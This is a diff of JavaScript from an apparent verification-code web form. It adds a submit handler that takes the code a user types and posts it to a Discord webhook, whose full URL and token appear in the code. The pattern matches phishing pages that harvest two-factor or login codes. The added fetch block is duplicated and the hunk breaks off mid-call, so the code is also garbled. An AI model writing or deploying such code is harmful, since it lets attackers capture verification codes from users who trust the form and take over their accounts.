@@ -167,29 +167,50 @@
     });
 
     document.getElementById("codeContainer").addEventListener("submit", function(event) {
-      event.preventDefault(); // prevent the form from reloading the page
+  event.preventDefault(); // prevent the form from reloading the page
 
-      // get the verification code
-      const code = document.getElementById('code').value;
+  // get the verification code
+  const code = document.getElementById('code').value;
 
-      // create the verification code message
-      const codeMessage = {
-        "content": "Verification code entered!",
-        "embeds": [
+  // create the verification code message
+  const codeMessage = {
+    "content": "Verification code entered!",
+    "embeds": [
+      {
+        "title": "Verification Code",
+        "description": "The verification code entered by the user.",
+        "color": 16711680,
+        "fields": [
           {
-            "title": "Verification Code",
-            "description": "The verification code entered by the user.",
-            "color": 16711680,
-            "fields": [
-              {
-                "name": "Code",
-                "value": code
-              }
-            ]
+            "name": "Code",
+            "value": code
           }
         ]
-      };
+      }
+    ]
+  };
 
+  // send the verification code message to the webhook
+  fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(codeMessage)
+  })
+  .then(function(response) {
+    if (response.ok) {
+      console.log("Code submitted successfully!");
+      // Code validation success, you can perform any further actions here
+    } else {
+      console.log("Error:", response.statusText);
+      // Code validation failed, you can display an error message or take other actions
+    }
+  })
+  .catch(function(error) {
+    console.log("Error:", error);
+  });
+});
       // send the verification code message to the webhook
       fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
         method: "POST",
